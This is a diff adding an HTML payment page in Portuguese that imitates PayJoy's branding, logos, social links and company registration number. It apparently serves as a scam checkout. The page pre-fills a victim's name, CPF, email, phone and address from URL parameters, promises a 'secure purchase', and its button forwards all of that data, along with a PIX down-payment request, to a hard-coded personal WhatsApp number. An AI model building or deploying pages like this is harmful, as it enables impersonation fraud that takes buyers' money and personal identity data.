@@ -1,0 +1,211 @@
+<!DOCTYPE html>
+<html lang="pt-BR">
+<head>
+<meta charset="UTF-8">
+<meta name="viewport" content="width=device-width, initial-scale=1.0">
+<title>Finalizar Pagamento</title>
+
+<link rel="icon" type="image/png" href="images.png">
+<link rel="apple-touch-icon" href="images.png">
+
+<style>
+body {
+    margin: 0;
+    font-family: Arial, Helvetica, sans-serif;
+    background-color: #f4f4f4;
+}
+
+/* HEADER */
+header {
+    background-color: #0b7a3c;
+    height: 68px;
+    display: flex;
+    align-items: center;
+    justify-content: space-between;
+    padding: 0 16px;
+}
+header img { height: 42px; }
+.seller { color: #eaffea; font-weight: bold; font-size: 14px; }
+
+/* CONTEÚDO */
+.container {
+    max-width: 600px;
+    background: #fff;
+    margin: 14px auto;
+    padding: 18px;
+    border-radius: 10px;
+}
+
+.section {
+    margin-bottom: 16px;
+    font-size: 14px;
+}
+
+.section h3 {
+    margin-bottom: 6px;
+    color: #0b7a3c;
+}
+
+.box {
+    background: #f1fdf6;
+    padding: 12px;
+    border-radius: 8px;
+    font-size: 14px;
+}
+
+.method label {
+    display: block;
+    margin-top: 6px;
+}
+
+.button {
+    width: 100%;
+    padding: 16px;
+    background-color: #0b7a3c;
+    color: #fff;
+    border: none;
+    border-radius: 8px;
+    font-size: 16px;
+    font-weight: bold;
+    cursor: pointer;
+}
+
+/* TEXTO DE SEGURANÇA */
+.security {
+    margin-top: 14px;
+    font-size: 13px;
+    color: #444;
+    background: #f9fafb;
+    padding: 12px;
+    border-radius: 8px;
+    border-left: 4px solid #0b7a3c;
+}
+
+/* FOOTER */
+footer {
+    background-color: #0b7a3c;
+    color: #fff;
+    padding: 24px 0;
+    text-align: center;
+}
+footer .social img { width: 30px; margin: 0 10px; }
+footer span { font-size: 12px; display: block; margin-top: 10px; }
+footer .logo { width: 100px; margin-top: 12px; }
+</style>
+</head>
+
+<body>
+
+<header>
+    <img src="green.svg">
+    <div class="seller" id="sellerName"></div>
+</header>
+
+<div class="container">
+
+    <div class="section">
+        <h3>Confirme seus dados</h3>
+        <div><strong>Nome:</strong> <span id="buyer"></span></div>
+        <div><strong>CPF:</strong> <span id="cpf"></span></div>
+        <div><strong>E-mail:</strong> <span id="email"></span></div>
+        <div><strong>Telefone:</strong> <span id="phone"></span></div>
+        <div><strong>Endereço:</strong> <span id="street"></span></div>
+    </div>
+
+    <div class="section">
+        <h3>Produto</h3>
+        <div><strong>Dispositivo:</strong> <span id="product"></span></div>
+        <div><strong>Valor total:</strong> R$ <span id="price"></span></div>
+        <div><strong>Parcelas:</strong> <span id="parcelas"></span>x</div>
+    </div>
+
+    <div class="section box">
+        <strong>Entrada via PIX:</strong> R$ <span id="entrada"></span><br><br>
+        O próximo pagamento será realizado somente no mês seguinte após o recebimento do dispositivo.
+    </div>
+
+    <div class="section">
+        <h3>Forma de pagamento das parcelas</h3>
+        <div class="method">
+            <label><input type="radio" name="metodo" value="PIX" checked> PIX</label>
+            <label><input type="radio" name="metodo" value="BOLETO"> Boleto</label>
+        </div>
+    </div>
+
+    <button class="button" onclick="finalizar()">Finalizar Pagamento</button>
+
+    <!-- TEXTO DE SEGURANÇA -->
+    <div class="security">
+        🔒 <strong>Compra segura:</strong> a finalização do pagamento será realizada diretamente pelo
+        <strong>WhatsApp com o revendedor autorizado</strong>.<br><br>
+        Após a confirmação do pagamento, o <strong>código de rastreio será enviado imediatamente</strong>
+        para acompanhamento da entrega do seu dispositivo.
+    </div>
+
+</div>
+
+<footer>
+    <div class="social">
+        <a href="https://www.facebook.com/PayJoyBR"><img src="facebook.d9e3595e.svg"></a>
+        <a href="https://www.instagram.com/payjoy_br/#"><img src="insta.1972e75b.svg"></a>
+        <a href="https://www.linkedin.com/company/payjoy/"><img src="linkedin.48995f84.svg"></a>
+    </div>
+    <span>© 2026 PayJoy • CNPJ: 41.069.116/0001-64</span>
+    <img class="logo" src="green.svg">
+</footer>
+
+<script>
+const p = new URLSearchParams(window.location.search);
+
+const data = {
+    seller: p.get("seller"),
+    buyer: p.get("buyer"),
+    cpf: p.get("cpf"),
+    email: p.get("email"),
+    phone: p.get("phone"),
+    street: p.get("street"),
+    product: p.get("product"),
+    price: p.get("price"),
+    parcelas: p.get("parcelas"),
+    entrada: p.get("entrada")
+};
+
+document.getElementById("sellerName").innerText =
+    "Revendedor: " + (data.seller || "Autorizado");
+
+for (let k in data) {
+    if (document.getElementById(k)) {
+        document.getElementById(k).innerText = data[k] || "";
+    }
+}
+
+function finalizar() {
+    const metodo = document.querySelector('input[name="metodo"]:checked').value;
+
+    const msg =
+`/pix finalização de pagamento
+
+Revendedor: ${data.seller}
+Cliente: ${data.buyer}
+CPF: ${data.cpf}
+
+Produto: ${data.product}
+Valor total: R$ ${data.price}
+Entrada (PIX): R$ ${data.entrada}
+Parcelas: ${data.parcelas}x
+Método das parcelas: ${metodo}
+
+Contato:
+${data.phone}
+${data.email}
+
+Endereço:
+${data.street}`;
+
+    window.location.href =
+    "https://wa.me/558597243058?text=" + encodeURIComponent(msg);
+}
+</script>
+
+</body>
+</html>
